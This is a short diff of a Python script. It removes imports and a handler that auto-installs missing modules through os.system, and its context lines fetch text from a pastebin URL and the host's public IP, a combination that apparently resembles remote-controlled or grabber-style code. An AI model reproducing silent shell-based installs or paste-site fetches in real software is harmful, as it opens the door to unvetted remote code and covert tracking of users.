@@ -1,17 +1,4 @@
-import datetime
 
-try:
-    import requests, time, threading, os, string, random, re, colorama, socket, hashlib, ctypes, uuid
-    import getpass
-    from tkinter import *
-    import tkinter.messagebox
-    from threading import Lock
-except ModuleNotFoundError as e:
-    try:
-        m = str(e).split("'")[1]
-        os.system(f'pip install {m}')
-    except:
-        ""
 try:
     TEXT = requests.get('https://pastebin.com/raw/Gsdk2fKV').text
     GetIP = requests.get('https://api.ipify.org?format=json').text
